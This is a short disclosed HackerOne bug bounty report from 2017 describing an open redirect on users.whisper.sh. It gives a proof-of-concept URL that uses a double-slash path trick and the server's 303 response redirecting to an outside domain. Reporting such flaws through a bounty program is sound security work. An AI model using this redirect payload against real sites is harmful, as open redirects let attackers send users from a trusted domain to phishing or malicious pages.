# Open Redirection Found in users.whisper.sh

## Report Details
- **Report ID**: 261592
- **URL**: https://hackerone.com/reports/261592
- **State**: Closed
- **Severity**: N/A
- **Submitted**: 2017-08-19T14:53:13.750Z
- **Disclosed**: 2017-09-21T06:43:01.549Z

## Reporter
- **Username**: hackedbrain
- **Name**: N/A

## Team
- **Name**: N/A
- **Handle**: whisper

## Vulnerability Information
I found that one of your subdomains users.whisper.sh is vulnerable to open redirection.

POC: `http://users.whisper.sh//google.com/%2f..`

Response:
```
HTTP/1.1 303 See Other
X-Powered-By: Express
Location: //google.com/%2f../
Set-Cookie: 
CM; Path=/; HttpOnly
Date: Sat, 19 Aug 2017 14:22:50 GMT
Content-Length: 34
Via: 1.1 google

Redirecting to //google.com/%2f../
```



## Attachments
No attachments
